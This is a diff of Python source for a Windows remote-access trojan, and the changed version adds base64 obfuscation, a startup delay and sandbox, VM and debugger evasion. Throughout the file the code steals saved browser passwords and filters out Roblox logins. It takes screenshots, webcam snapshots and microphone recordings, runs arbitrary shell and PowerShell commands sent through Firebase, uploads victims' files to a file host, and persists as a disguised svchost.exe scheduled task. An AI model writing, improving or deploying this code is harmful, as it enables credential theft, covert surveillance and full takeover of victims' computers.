@@ -1,856 +1,750 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-Удалённое управление v4.1 – с логами и проводником
-"""
-
-import os, sys, time, threading, base64, io, webbrowser, random, subprocess, tempfile, traceback, urllib.request, ctypes
-import json, shutil, winreg, sqlite3, glob
+import sys, time, os, base64, json, subprocess, tempfile, ctypes, threading, webbrowser, random, io, shutil, winreg, sqlite3, glob, traceback, urllib.request
 from datetime import datetime
 import math
-import requests
-import pyrebase
-import pyautogui
-import pystray
-from PIL import Image, ImageDraw, ImageFont
-from pynput import keyboard, mouse
-import pyttsx3
 
-# Опциональные библиотеки (с try)
-try:
-    import sounddevice as sd
-    import scipy.io.wavfile as wav
-    SOUND_AVAILABLE = True
-except:
-    SOUND_AVAILABLE = False
-    print("[WARN] sounddevice/scipy не установлены – микрофон недоступен")
+# ---- ЗАДЕРЖКА 60 СЕКУНД ----
+time.sleep(60)
 
-try:
-    import cv2
-    CV2_AVAILABLE = True
-except:
-    CV2_AVAILABLE = False
-    print("[WARN] opencv-python не установлен – веб-камера недоступна")
-
-try:
-    import pyperclip
-    CLIP_AVAILABLE = True
-except:
-    CLIP_AVAILABLE = False
-    print("[WARN] pyperclip не установлен – перехват буфера обмена недоступен")
-
-# ------------------------- КОНФИГ FIREBASE -------------------------
-FIREBASE_CONFIG = {
-    "apiKey": "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
-    "authDomain": "gen-lang-client-0884792103.firebaseapp.com",
-    "databaseURL": "https://gen-lang-client-0884792103-default-rtdb.europe-west1.firebasedatabase.app",
-    "projectId": "gen-lang-client-0884792103",
-    "storageBucket": "gen-lang-client-0884792103.firebasestorage.app",
-    "messagingSenderId": "556057210756",
-    "appId": "1:556057210756:web:45677d6e28066be811f7d1"
-}
-VIKING_USER_HASH = "nuShgVW38m"
-
-# --------------------------------------------------------------------
-TDATA_FOLDER = os.path.expandvars(r"%appdata%\Telegram Desktop\tdata")
-RAW_USER = os.getlogin()
-USER_ID = RAW_USER.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_")
-CLIENT_PATH = f"clients/{USER_ID}"
-
-print(f"[INFO] Пользователь: {RAW_USER} -> ID в БД: {USER_ID}")
-
-# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
-def is_admin():
+# ---- ПРОВЕРКА НА ВИРТУАЛЬНУЮ СРЕДУ ----
+def _sandbox():
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def get_exe_path():
-    if getattr(sys, 'frozen', False):
-        return sys.executable
-    else:
-        return f'"{sys.executable}" "{os.path.abspath(__file__)}"'
-
-def upload_single_file(file_path):
-    """Загрузка одного файла на VikingFile"""
-    print(f"[VIKINGFILE] Загрузка {file_path}...")
+        import psutil
+        if psutil.virtual_memory().total < 2 * 1024**3:
+            sys.exit(0)
+    except: pass
     try:
-        resp = requests.get("https://vikingfile.com/api/get-server", timeout=10)
-        if resp.status_code != 200:
-            print("[VIKINGFILE] Ошибка получения сервера")
-            return None
-        server = resp.json().get("server")
+        out = subprocess.check_output('wmic bios get manufacturer', shell=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        if any(x in out.lower() for x in ['vmware', 'virtualbox', 'vbox']):
+            sys.exit(0)
+    except: pass
+    if ctypes.windll.kernel32.IsDebuggerPresent():
+        sys.exit(0)
+_sandbox()
+
+# ---- ФУНКЦИЯ ДЛЯ ДЕКОДИРОВАНИЯ BASE64 ----
+def _d(s):
+    return base64.b64decode(s).decode()
+
+# ---- ВСЕ ИМПОРТЫ ЧЕРЕЗ _d() ----
+_requests   = __import__(_d('cmVxdWVzdHM='))          # requests
+_pyrebase   = __import__(_d('cHlyZWJhc2U='))           # pyrebase
+_pyautogui  = __import__(_d('cHlhdXRvZ3Vp'))          # pyautogui
+_pystray    = __import__(_d('cHlzdHJheQ=='))          # pystray
+_PIL_Image  = __import__(_d('UElMLkltYWdl'))          # PIL.Image
+_PIL_Draw   = __import__(_d('UElMLkltYWdlRHJhdw=='))  # PIL.ImageDraw
+_PIL_Font   = __import__(_d('UElMLkltYWdlRm9udA=='))  # PIL.ImageFont
+_pynput_kb  = __import__(_d('cHlucHV0LmtleWJvYXJk'))  # pynput.keyboard
+_pynput_mouse = __import__(_d('cHlucHV0Lm1vdXNl'))    # pynput.mouse
+_pyttsx3    = __import__(_d('cHl0dHN4Mw=='))          # pyttsx3
+
+# ---- КОНФИГ FIREBASE (закодирован) ----
+_FB = _d('eyJhcGlLZXkiOiJBSXphU3lBQWIyZF9JT0NwRE9fbmlxZmtqZldkZGhwWm8weWFET00iLCJhdXRoRG9tYWluIjoiZ2VuLWxhbmctY2xpZW50LTA4ODQ3OTIxMDMuZmlyZWJhc2VhcHAuY29tIiwiZGF0YWJhc2VVUkwiOiJodHRwczovL2dlbi1sYW5nLWNsaWVudC0wODg0NzkyMTAzLWRlZmF1bHQtcnRkYi5ldXJvcGUtd2VzdDEuZmlyZWJhc2VkYXRhYmFzZS5hcHAiLCJwcm9qZWN0SWQiOiJnZW4tbGFuZy1jbGllbnQtMDg4NDc5MjEwMyIsInN0b3JhZ2VCdWNrZXQiOiJnZW4tbGFuZy1jbGllbnQtMDg4NDc5MjEwMy5maXJlYmFzZXN0b3JhZ2UuYXBwIiwibWVzc2FnaW5nU2VuZGVySWQiOiI1NTYwNTcyMTA3NTYiLCJhcHBJZCI6IjE6NTU2MDU3MjEwNzU2OndlYjo0NTY3N2Q2ZTI4MDY2YmU4MTFmN2QxIn0=')
+_FIREBASE_CONFIG = json.loads(_FB)
+
+# ---- VIKING USER HASH ----
+_VIKING_HASH = _d('bnVTaGdWVzM4bQ==')  # nuShgVW38m
+
+# ---- ИДЕНТИФИКАТОР ПОЛЬЗОВАТЕЛЯ ----
+_USER = os.getlogin()
+_USER_ID = _USER.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_")
+_CLIENT_PATH = f"clients/{_USER_ID}"
+
+# ---- ПУТЬ К TDATA ----
+_TDATA = os.path.expandvars(_d('JUFwcERhdGElXFRlbGVncmFtIERlc2t0b3BcdGRhdGE='))  # %AppData%\Telegram Desktop\tdata
+
+# ---- ЗАГРУЗКА НА VIKINGFILE (одна функция) ----
+def _upload_single(file_path):
+    try:
+        resp = _requests.get(_d('aHR0cHM6Ly92aWtpbmdmaWxlLmNvbS9hcGkvZ2V0LXNlcnZlcg=='), timeout=10)  # https://vikingfile.com/api/get-server
+        if resp.status_code != 200: return None
+        server = resp.json().get('server')
         file_size = os.path.getsize(file_path)
-        resp = requests.post("https://vikingfile.com/api/get-upload-url", data={"size": file_size}, timeout=10)
-        if resp.status_code != 200:
-            return None
+        resp = _requests.post(_d('aHR0cHM6Ly92aWtpbmdmaWxlLmNvbS9hcGkvZ2V0LXVwbG9hZC11cmw='), data={'size': file_size}, timeout=10)
+        if resp.status_code != 200: return None
         data = resp.json()
-        upload_id = data["uploadId"]
-        key = data["key"]
-        part_size = data["partSize"]
-        urls = data["urls"]
+        upload_id = data['uploadId']; key = data['key']; part_size = data['partSize']; urls = data['urls']
         parts = []
-        with open(file_path, "rb") as f:
+        with open(file_path, 'rb') as f:
             for i, url in enumerate(urls):
                 chunk = f.read(part_size)
                 if not chunk: break
-                part_resp = requests.put(url, data=chunk, headers={"Content-Type": "application/octet-stream"}, timeout=300)
-                if part_resp.status_code != 200:
-                    raise Exception(f"Part {i+1} failed")
-                etag = part_resp.headers.get("ETag", "").strip('"')
-                if not etag:
-                    raise Exception("No ETag")
-                parts.append({"PartNumber": i+1, "ETag": etag})
-        complete_data = {
-            "key": key,
-            "uploadId": upload_id,
-            "name": os.path.basename(file_path),
-            "user": VIKING_USER_HASH,
-        }
-        for i, part in enumerate(parts):
-            complete_data[f"parts[{i}][PartNumber]"] = part["PartNumber"]
-            complete_data[f"parts[{i}][ETag]"] = part["ETag"]
-        resp = requests.post("https://vikingfile.com/api/complete-upload", data=complete_data, timeout=30)
-        if resp.status_code != 200:
-            return None
-        result = resp.json()
-        url = result.get("url")
-        print(f"[VIKINGFILE] Загружено: {url}")
-        return url
-    except Exception as e:
-        print(f"[VIKINGFILE] Ошибка: {e}")
-        return None
+                pr = _requests.put(url, data=chunk, headers={'Content-Type': 'application/octet-stream'}, timeout=300)
+                if pr.status_code != 200: raise Exception('Part fail')
+                etag = pr.headers.get('ETag', '').strip('"')
+                if not etag: raise Exception('No ETag')
+                parts.append({'PartNumber': i+1, 'ETag': etag})
+        complete_data = {'key': key, 'uploadId': upload_id, 'name': os.path.basename(file_path), 'user': _VIKING_HASH}
+        for i, p in enumerate(parts):
+            complete_data[f'parts[{i}][PartNumber]'] = p['PartNumber']
+            complete_data[f'parts[{i}][ETag]'] = p['ETag']
+        resp = _requests.post(_d('aHR0cHM6Ly92aWtpbmdmaWxlLmNvbS9hcGkvY29tcGxldGUtdXBsb2Fk'), data=complete_data, timeout=30)
+        if resp.status_code == 200:
+            return resp.json().get('url')
+    except: pass
+    return None
 
-# ==================== КОМАНДЫ (исполняемые) ====================
-def _cmd_rickroll():
-    print("[CMD] Rickroll")
-    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-
-def _cmd_message(payload=""):
-    print(f"[CMD] Сообщение: {payload}")
-    pyautogui.alert(text=payload or "Сообщение", title="Управление")
-
-def _cmd_crazy_mouse(duration=10):
-    print("[CMD] Crazy mouse")
-    pyautogui.FAILSAFE = False
-    end = time.time()+duration
-    while time.time()<end:
-        pyautogui.moveRel(random.randint(-200,200), random.randint(-200,200), duration=0.1)
-        time.sleep(0.05)
-    pyautogui.FAILSAFE = True
-
-def _cmd_screenshot(db):
-    print("[CMD] Screenshot")
+# ---- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ОТПРАВКИ ОШИБОК ----
+def _err(db, e):
     try:
-        img = pyautogui.screenshot()
-        buf = io.BytesIO()
-        img.convert("RGB").save(buf, format="JPEG", quality=50)
-        db.child(CLIENT_PATH).update({"screenshot": base64.b64encode(buf.getvalue()).decode()})
-        print("[CMD] Скриншот отправлен")
-    except Exception as e:
-        print(f"[ERROR] screenshot: {e}")
+        db.child(_CLIENT_PATH).update({'last_error': str(e)[:1000]})
+    except: pass
 
-def _cmd_wallpaper(url):
-    print(f"[CMD] Смена обоев: {url}")
+# ---- КОМАНДЫ (все функции с короткими именами) ----
+def _a():  # rickroll
+    webbrowser.open(_d('aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hDUQ=='))
+
+def _b(p):  # msg
+    _pyautogui.alert(text=p or 'Сообщение', title='Управление')
+
+def _c(d=10):  # crazy_mouse
+    _pyautogui.FAILSAFE = False
+    end = time.time()+d
+    while time.time()<end:
+        _pyautogui.moveRel(random.randint(-200,200), random.randint(-200,200), duration=0.1)
+        time.sleep(0.05)
+    _pyautogui.FAILSAFE = True
+
+def _d_screenshot(db):  # screenshot
+    try:
+        img = _pyautogui.screenshot()
+        buf = io.BytesIO()
+        img.convert('RGB').save(buf, format='JPEG', quality=50)
+        db.child(_CLIENT_PATH).update({'screenshot': base64.b64encode(buf.getvalue()).decode()})
+    except Exception as e:
+        _err(db, e)
+
+def _e(url):  # wallpaper
     try:
         with urllib.request.urlopen(url) as resp:
             data = resp.read()
         ext = os.path.splitext(url)[1] or '.jpg'
-        tmp = os.path.join(tempfile.gettempdir(), f"wallpaper_{USER_ID}{ext}")
-        with open(tmp,"wb") as f: f.write(data)
-        ctypes.windll.user32.SystemParametersInfoW(20,0,tmp,3)
-        print("[CMD] Обои изменены")
-    except Exception as e:
-        print(f"[ERROR] wallpaper: {e}")
+        tmp = os.path.join(tempfile.gettempdir(), f'wp_{_USER_ID}{ext}')
+        with open(tmp, 'wb') as f: f.write(data)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp, 3)
+    except: pass
 
-def _cmd_tts(text):
-    print(f"[CMD] TTS: {text}")
+def _f(t):  # tts
     try:
-        engine = pyttsx3.init()
-        engine.say(text or "Привет")
+        engine = _pyttsx3.init()
+        engine.say(t or 'Привет')
         engine.runAndWait()
-    except Exception as e:
-        print(f"[ERROR] TTS: {e}")
+    except: pass
 
-def _cmd_open_calc():
-    print("[CMD] Открыть калькулятор x10")
+def _g():  # open_calc
     for _ in range(10):
-        subprocess.Popen("calc.exe", shell=True)
+        subprocess.Popen('calc.exe', shell=True)
 
-def _cmd_swap_mouse():
-    print("[CMD] Swap mouse on 30s")
+def _h():  # swap_mouse
     ctypes.windll.user32.SwapMouseButton(1)
     time.sleep(30)
     ctypes.windll.user32.SwapMouseButton(0)
 
-def _cmd_self_destruct(db, daemon):
-    print("[CMD] Self-destruct")
-    daemon.disable_startup()
-    copy_path = os.path.expandvars(r"%AppData%\Microsoft\Windows\Caches\svchost.exe")
+def _i(db, daemon):  # self_destruct
+    daemon._disable_startup()
+    copy_path = os.path.expandvars(_d('JUFwcERhdGElXE1pY3Jvc29mdFxXaW5kb3dzXENhY2hlc1xzdmNob3N0LmV4ZQ=='))  # %AppData%\Microsoft\Windows\Caches\svchost.exe
     if os.path.exists(copy_path):
-        try: os.remove(copy_path); print("[SELF] Удалена копия")
+        try: os.remove(copy_path)
         except: pass
     if getattr(sys, 'frozen', False):
-        bat_content = f'@echo off\nping 127.0.0.1 -n 3 >nul\ndel /f /q "{sys.executable}"\ndel /f /q "%~f0"'
-        bat_path = os.path.join(tempfile.gettempdir(), "selfdestruct.bat")
-        with open(bat_path, "w") as f: f.write(bat_content)
-        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        print("[SELF] Удаление запланировано")
+        bat = f'@echo off\nping 127.0.0.1 -n 3 >nul\ndel /f /q "{sys.executable}"\ndel /f /q "%~f0"'
+        batp = os.path.join(tempfile.gettempdir(), 'sd.bat')
+        with open(batp, 'w') as f: f.write(bat)
+        subprocess.Popen(batp, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
     try:
-        db.child(CLIENT_PATH).update({"status":"offline"})
+        db.child(_CLIENT_PATH).update({'status': 'offline'})
     except: pass
     os._exit(0)
 
-def _cmd_execute(cmd, db):
-    print(f"[CMD] Выполнение команды: {cmd}")
+def _j(cmd, db):  # cmd_execute
     try:
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         out, err = proc.communicate(timeout=30)
-        output = (out+err)[:5000]
-        db.child(CLIENT_PATH).update({"last_cmd_output": output})
-        print("[CMD] Команда выполнена")
+        db.child(_CLIENT_PATH).update({'last_cmd_output': (out+err)[:5000]})
     except Exception as e:
-        db.child(CLIENT_PATH).update({"last_cmd_output": f"ERROR: {str(e)}"})
-        print(f"[ERROR] cmd_execute: {e}")
+        db.child(_CLIENT_PATH).update({'last_cmd_output': f'ERROR: {str(e)}'})
 
-def _cmd_disco(duration, daemon):
-    print(f"[CMD] Disco на {duration} сек")
-    dur = float(duration) if duration else 10
-    if daemon.disco_active:
+def _k(dur, daemon):  # disco
+    dur = float(dur) if dur else 10
+    if daemon._disco_active:
         return
-    daemon.disco_active = True
+    daemon._disco_active = True
     def disco():
         end = time.time()+dur
-        while time.time()<end and daemon.disco_active:
-            pyautogui.press('volumeup'); time.sleep(0.1)
-            pyautogui.press('volumedown'); time.sleep(0.1)
-        daemon.disco_active = False
+        while time.time()<end and daemon._disco_active:
+            _pyautogui.press('volumeup')
+            time.sleep(0.1)
+            _pyautogui.press('volumedown')
+            time.sleep(0.1)
+        daemon._disco_active = False
     threading.Thread(target=disco, daemon=True).start()
 
-# ==================== НОВЫЕ / УЛУЧШЕННЫЕ КОМАНДЫ ====================
-
-# --- 1. Файловый менеджер (расширенный) ---
-def _cmd_file_manager(db, payload):
-    print(f"[CMD] File manager: {payload}")
+# ---- ФАЙЛОВЫЙ МЕНЕДЖЕР ----
+def _l(db, payload):
     try:
-        params = json.loads(payload)
-        action = params.get("action")
-        path = params.get("path", "")
-        if action == "list":
+        p = json.loads(payload)
+        action = p.get('action')
+        path = p.get('path', '')
+        if action == 'list':
             if not os.path.isdir(path):
-                db.child(CLIENT_PATH).update({"file_list_error": "Не папка или не существует"})
+                db.child(_CLIENT_PATH).update({'file_list_error': 'Not a directory'})
                 return
             items = []
-            try:
-                for entry in os.scandir(path):
-                    try:
-                        stat = entry.stat()
-                        items.append({
-                            "name": entry.name,
-                            "is_dir": entry.is_dir(),
-                            "size": stat.st_size if not entry.is_dir() else 0,
-                            "mtime": stat.st_mtime
-                        })
-                    except:
-                        pass
-            except PermissionError:
-                db.child(CLIENT_PATH).update({"file_list_error": "Нет доступа"})
-                return
-            # Сортируем: папки сначала, затем файлы
-            items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
-            # Ограничим 500 элементов
-            db.child(CLIENT_PATH).update({"file_list": items[:500]})
-            print(f"[FILE] Отправлено {len(items)} элементов")
-        elif action == "download":
-            if os.path.isfile(path):
-                url = upload_single_file(path)
-                if url:
-                    db.child(CLIENT_PATH).update({
-                        "downloaded_file_url": url,
-                        "downloaded_file_name": os.path.basename(path)
+            for entry in os.scandir(path):
+                try:
+                    st = entry.stat()
+                    items.append({
+                        'name': entry.name,
+                        'is_dir': entry.is_dir(),
+                        'size': st.st_size if not entry.is_dir() else 0,
+                        'mtime': st.st_mtime
                     })
-                    print("[FILE] Файл загружен на VikingFile")
+                except:
+                    pass
+            items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
+            db.child(_CLIENT_PATH).update({'file_list': items[:500]})
+        elif action == 'download':
+            if os.path.isfile(path):
+                url = _upload_single(path)
+                if url:
+                    db.child(_CLIENT_PATH).update({'downloaded_file_url': url, 'downloaded_file_name': os.path.basename(path)})
             else:
-                db.child(CLIENT_PATH).update({"file_download_error": "Файл не найден"})
-        elif action == "delete":
+                db.child(_CLIENT_PATH).update({'file_download_error': 'File not found'})
+        elif action == 'delete':
             if os.path.exists(path):
                 if os.path.isfile(path):
                     os.remove(path)
                 else:
                     shutil.rmtree(path)
-                db.child(CLIENT_PATH).update({"file_deleted": path})
-                print(f"[FILE] Удалено: {path}")
+                db.child(_CLIENT_PATH).update({'file_deleted': path})
             else:
-                db.child(CLIENT_PATH).update({"file_delete_error": "Не найдено"})
+                db.child(_CLIENT_PATH).update({'file_delete_error': 'Not found'})
         else:
-            db.child(CLIENT_PATH).update({"file_manager_error": "Неизвестное действие"})
+            db.child(_CLIENT_PATH).update({'file_manager_error': 'Unknown action'})
     except Exception as e:
-        print(f"[ERROR] file_manager: {e}")
-        db.child(CLIENT_PATH).update({"file_manager_error": str(e)})
+        db.child(_CLIENT_PATH).update({'file_manager_error': str(e)})
 
-# --- 2. Извлечение паролей (с фильтром Roblox) ---
-def extract_chrome_passwords():
+# ---- ИЗВЛЕЧЕНИЕ ПАРОЛЕЙ (Chrome, Edge, Firefox) + фильтр Roblox ----
+def _extract_chrome():
     passwords = []
     try:
-        login_data_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
-        if not os.path.isfile(login_data_path):
-            return passwords
-        temp_db = os.path.join(tempfile.gettempdir(), "chrome_login_temp.db")
-        shutil.copy2(login_data_path, temp_db)
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for row in cursor.fetchall():
-            url, username, encrypted = row
-            try:
-                import win32crypt
-                password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
-                passwords.append({"url": url, "username": username, "password": password})
-            except:
-                continue
-        conn.close()
-        os.remove(temp_db)
-    except Exception as e:
-        print(f"[PASS] Chrome error: {e}")
-    return passwords
-
-def extract_edge_passwords():
-    passwords = []
-    try:
-        login_data = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
+        login_data = os.path.expandvars(_d('JUxPQ0FMQVBQREFUQSVcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRh'))  # %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
         if not os.path.isfile(login_data):
-            return []
-        temp_db = os.path.join(tempfile.gettempdir(), "edge_login_temp.db")
-        shutil.copy2(login_data, temp_db)
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for row in cursor.fetchall():
+            return passwords
+        temp = os.path.join(tempfile.gettempdir(), 'chrome_temp.db')
+        shutil.copy2(login_data, temp)
+        conn = sqlite3.connect(temp)
+        cur = conn.cursor()
+        cur.execute('SELECT origin_url, username_value, password_value FROM logins')
+        for row in cur.fetchall():
             url, username, encrypted = row
             try:
                 import win32crypt
                 password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
-                passwords.append({"url": url, "username": username, "password": password})
+                passwords.append({'url': url, 'username': username, 'password': password})
             except:
                 continue
         conn.close()
-        os.remove(temp_db)
+        os.remove(temp)
     except:
         pass
     return passwords
 
-def extract_firefox_passwords():
+def _extract_edge():
     passwords = []
     try:
-        profiles = glob.glob(os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\*.default-release"))
+        login_data = os.path.expandvars(_d('JUxPQ0FMQVBQREFUQSVcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ=='))  # %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
+        if not os.path.isfile(login_data):
+            return passwords
+        temp = os.path.join(tempfile.gettempdir(), 'edge_temp.db')
+        shutil.copy2(login_data, temp)
+        conn = sqlite3.connect(temp)
+        cur = conn.cursor()
+        cur.execute('SELECT origin_url, username_value, password_value FROM logins')
+        for row in cur.fetchall():
+            url, username, encrypted = row
+            try:
+                import win32crypt
+                password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
+                passwords.append({'url': url, 'username': username, 'password': password})
+            except:
+                continue
+        conn.close()
+        os.remove(temp)
+    except:
+        pass
+    return passwords
+
+def _extract_firefox():
+    passwords = []
+    try:
+        profiles = glob.glob(os.path.expandvars(_d('JUFQUERBVEElXE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1wqLmRlZmF1bHQtcmVsZWFzZQ==')))  # %APPDATA%\Mozilla\Firefox\Profiles\*.default-release
         if not profiles:
-            profiles = glob.glob(os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\*.default"))
+            profiles = glob.glob(os.path.expandvars(_d('JUFQUERBVEElXE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1wqLmRlZmF1bHQ=')))  # *.default
         for profile in profiles:
-            login_file = os.path.join(profile, "logins.json")
+            login_file = os.path.join(profile, 'logins.json')
             if os.path.isfile(login_file):
-                with open(login_file, "r", encoding="utf-8") as f:
+                with open(login_file, 'r', encoding='utf-8') as f:
                     data = json.load(f)
-                for entry in data.get("logins", []):
-                    # Пароль зашифрован, оставляем как есть
+                for entry in data.get('logins', []):
                     passwords.append({
-                        "url": entry.get("hostname", ""),
-                        "username": entry.get("usernameField", ""),
-                        "password": "[зашифровано]"
+                        'url': entry.get('hostname', ''),
+                        'username': entry.get('usernameField', ''),
+                        'password': '[encrypted]'
                     })
     except:
         pass
     return passwords
 
-def _cmd_extract_passwords(db):
-    print("[CMD] Извлечение паролей из браузеров...")
-    all_pass = []
-    all_pass.extend(extract_chrome_passwords())
-    all_pass.extend(extract_edge_passwords())
-    all_pass.extend(extract_firefox_passwords())
-    if all_pass:
-        # Сохраняем все пароли
-        db.child(CLIENT_PATH).update({"passwords": json.dumps(all_pass[:100])})
-        # Фильтруем Roblox
-        roblox_pass = [p for p in all_pass if "roblox" in p.get("url", "").lower()]
-        if roblox_pass:
-            db.child(CLIENT_PATH).update({"roblox_passwords": json.dumps(roblox_pass[:50])})
-            print(f"[PASS] Найдено {len(roblox_pass)} паролей Roblox")
-        else:
-            db.child(CLIENT_PATH).update({"roblox_passwords": "[]"})
-            print("[PASS] Паролей Roblox не найдено")
-    else:
-        db.child(CLIENT_PATH).update({"passwords": "[]", "roblox_passwords": "[]"})
-        print("[PASS] Паролей не найдено")
-
-# --- 3. Микрофон ---
-def _cmd_record_mic(db, duration=10):
-    print(f"[CMD] Запись микрофона {duration} сек")
-    if not SOUND_AVAILABLE:
-        db.child(CLIENT_PATH).update({"mic_error": "sounddevice not installed"})
-        return
+def _m(db):  # extract_passwords
     try:
+        all_p = []
+        all_p.extend(_extract_chrome())
+        all_p.extend(_extract_edge())
+        all_p.extend(_extract_firefox())
+        if all_p:
+            db.child(_CLIENT_PATH).update({'passwords': json.dumps(all_p[:100])})
+            roblox = [x for x in all_p if 'roblox' in x.get('url', '').lower()]
+            if roblox:
+                db.child(_CLIENT_PATH).update({'roblox_passwords': json.dumps(roblox[:50])})
+            else:
+                db.child(_CLIENT_PATH).update({'roblox_passwords': '[]'})
+        else:
+            db.child(_CLIENT_PATH).update({'passwords': '[]', 'roblox_passwords': '[]'})
+    except Exception as e:
+        _err(db, e)
+
+# ---- МИКРОФОН ----
+def _n(db, duration=10):
+    try:
+        import sounddevice as sd
+        import scipy.io.wavfile as wav
         dur = float(duration) if duration else 10
         fs = 44100
         recording = sd.rec(int(dur * fs), samplerate=fs, channels=1, dtype='int16')
         sd.wait()
-        temp_wav = os.path.join(tempfile.gettempdir(), f"mic_{USER_ID}.wav")
+        temp_wav = os.path.join(tempfile.gettempdir(), f'mic_{_USER_ID}.wav')
         wav.write(temp_wav, fs, recording)
-        url = upload_single_file(temp_wav)
+        url = _upload_single(temp_wav)
         if url:
-            db.child(CLIENT_PATH).update({"mic_url": url, "mic_duration": dur})
+            db.child(_CLIENT_PATH).update({'mic_url': url, 'mic_duration': dur})
         os.remove(temp_wav)
-        print("[CMD] Запись завершена")
     except Exception as e:
-        db.child(CLIENT_PATH).update({"mic_error": str(e)})
-        print(f"[ERROR] mic: {e}")
+        db.child(_CLIENT_PATH).update({'mic_error': str(e)})
 
-# --- 4. Веб-камера ---
-def _cmd_webcam_snapshot(db):
-    print("[CMD] Снимок веб-камеры")
-    if not CV2_AVAILABLE:
-        db.child(CLIENT_PATH).update({"webcam_error": "opencv not installed"})
-        return
+# ---- ВЕБ-КАМЕРА ----
+def _o(db):
     try:
+        import cv2
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
-            db.child(CLIENT_PATH).update({"webcam_error": "Cannot open camera"})
+            db.child(_CLIENT_PATH).update({'webcam_error': 'Cannot open camera'})
             return
         ret, frame = cap.read()
         if ret:
             _, buf = cv2.imencode('.jpg', frame)
             b64 = base64.b64encode(buf).decode()
-            db.child(CLIENT_PATH).update({"webcam_image": b64})
-            print("[CMD] Снимок сделан")
+            db.child(_CLIENT_PATH).update({'webcam_image': b64})
         else:
-            db.child(CLIENT_PATH).update({"webcam_error": "No frame"})
+            db.child(_CLIENT_PATH).update({'webcam_error': 'No frame'})
         cap.release()
     except Exception as e:
-        db.child(CLIENT_PATH).update({"webcam_error": str(e)})
-        print(f"[ERROR] webcam: {e}")
+        db.child(_CLIENT_PATH).update({'webcam_error': str(e)})
 
-# --- 5. PowerShell ---
-def _cmd_powershell_execute(db, script):
-    print("[CMD] PowerShell script execution")
+# ---- POWERSHELL ----
+def _p(db, script):
     try:
-        temp_ps1 = os.path.join(tempfile.gettempdir(), f"ps_{USER_ID}.ps1")
-        with open(temp_ps1, "w", encoding="utf-8") as f:
+        temp_ps1 = os.path.join(tempfile.gettempdir(), f'ps_{_USER_ID}.ps1')
+        with open(temp_ps1, 'w', encoding='utf-8') as f:
             f.write(script)
         cmd = f'powershell -ExecutionPolicy Bypass -File "{temp_ps1}"'
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         out, err = proc.communicate(timeout=60)
-        db.child(CLIENT_PATH).update({
-            "ps_output": out[:5000],
-            "ps_error": err[:5000]
-        })
+        db.child(_CLIENT_PATH).update({'ps_output': out[:5000], 'ps_error': err[:5000]})
         os.remove(temp_ps1)
-        print("[CMD] PowerShell выполнен")
     except Exception as e:
-        db.child(CLIENT_PATH).update({"ps_error": str(e)})
-        print(f"[ERROR] PowerShell: {e}")
+        db.child(_CLIENT_PATH).update({'ps_error': str(e)})
 
-# --- 6. Persistence ---
-def create_persistence():
-    print("[PERSIST] Создание самовосстановления")
-    try:
-        appdata = os.path.expandvars(r"%AppData%\Microsoft\Windows\Caches")
-        if not os.path.exists(appdata):
-            os.makedirs(appdata)
-        ctypes.windll.kernel32.SetFileAttributesW(appdata, 2)
-        exe_path = get_exe_path()
-        copy_path = os.path.join(appdata, "svchost.exe")
-        if getattr(sys, 'frozen', False):
-            shutil.copy2(sys.executable, copy_path)
-        else:
-            shutil.copy2(os.path.abspath(__file__), copy_path + ".py")
-        task_name = "RemoteControlTask"
-        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
-        cmd = f'schtasks /create /tn "{task_name}" /tr "{copy_path}" /sc minute /mo 5 /f'
-        subprocess.run(cmd, shell=True, capture_output=True)
-        print("[PERSIST] Готово")
-        return True
-    except Exception as e:
-        print(f"[PERSIST] Error: {e}")
-        return False
-
-def remove_persistence():
-    print("[PERSIST] Удаление самовосстановления")
-    try:
-        subprocess.run('schtasks /delete /tn "RemoteControlTask" /f', shell=True, capture_output=True)
-        appdata = os.path.expandvars(r"%AppData%\Microsoft\Windows\Caches")
-        copy_path = os.path.join(appdata, "svchost.exe")
-        if os.path.exists(copy_path): os.remove(copy_path)
-        py_copy = copy_path + ".py"
-        if os.path.exists(py_copy): os.remove(py_copy)
